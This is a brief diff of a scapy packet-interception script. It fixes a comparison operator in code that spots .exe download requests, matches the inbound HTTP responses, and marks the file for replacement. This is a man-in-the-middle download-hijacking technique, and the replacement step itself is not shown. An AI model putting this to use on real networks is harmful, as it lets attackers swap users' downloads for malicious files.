@@ -34,7 +34,7 @@ def process_packet(packet):
                 print("\n****EXE FOUND****\n")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 print(scapy_packet.show())
-        elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
+        elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
             if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                     ack_list.remove(scapy_packet[scapy.TCP].seq)
                     print("++Replacing file")
